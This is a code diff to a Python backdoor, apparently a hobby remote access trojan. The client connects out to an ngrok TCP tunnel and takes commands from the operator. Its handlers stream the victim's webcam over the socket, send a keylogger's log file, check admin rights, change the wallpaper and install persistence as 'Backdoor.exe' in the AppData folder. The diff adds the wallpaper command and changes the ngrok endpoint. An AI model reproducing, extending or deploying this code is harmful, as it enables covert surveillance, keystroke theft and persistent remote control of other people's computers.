@@ -144,26 +144,27 @@ def get(url):
     with open(file_name, "wb") as out_file:
         out_file.write(get_response.content)
 
+
 def stream(stop):
     while True:
         vid = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-        
+
         while(vid.isOpened()):
-            img,frame = vid.read()
-            frame = imutils.resize(frame,width=320)
+            img, frame = vid.read()
+            frame = imutils.resize(frame, width=320)
             a = pickle.dumps(frame)
-            message = struct.pack("Q",len(a))+a
+            message = struct.pack("Q", len(a))+a
             sock.sendall(message)
-            
+
             # cv2.imshow('TRANSMITTING VIDEO',frame)
             key = cv2.waitKey(1) & 0xFF
             if key == ord('q') or stop():
                 vid.release()
                 cv2.destroyAllWindows()
-                break             
+                break
         if stop():
             break
-				
+
 
 # def connection():
 #     while True:
@@ -178,7 +179,8 @@ def stream(stop):
 
 def shell():
     stop_threads = False
-    stream_thread = threading.Thread(target=stream, args =(lambda : stop_threads, ))
+    stream_thread = threading.Thread(
+        target=stream, args=(lambda: stop_threads, ))
 
     while True:
         command = reliable_recv()
@@ -274,19 +276,27 @@ def shell():
             t1.start()
 
         elif command[:11] == "dump_keylog":
-            print("we're in")
             with open("logger.txt", "rb") as sc:
-                print("am here")
                 img = sc.read()
                 send_file(img)
-                print("logged")
 
         elif command[:5] == "check":
             try:
                 is_admin()
                 reliable_send(admin)
             except:
-                reliable_send("Failed to check")
+                reliable_send("[!!] Failed to check")
+
+        elif command[:9] == "wallpaper":
+            try:
+                path = command[10:]
+                res = ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
+                if res == 1:
+                    reliable_send("[+] Wallpaper changed successfully")
+                else:
+                    reliable_send("[!!] Failed to change the wallpaper")
+            except:
+                reliable_send("[!!] Failed to change the wallpaper")
 
         elif command[:11] == "persistance":
             location = os.environ["appdata"] + "\\Backdoor.exe"
@@ -328,7 +338,7 @@ def shell():
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # connection()
-sock.connect(("4.tcp.ngrok.io", 14519)) # ngrok tcp 9001
+sock.connect(("0.tcp.ngrok.io", 16597))  # ngrok tcp 9001
 print("connected")
 shell()
 sock.close()
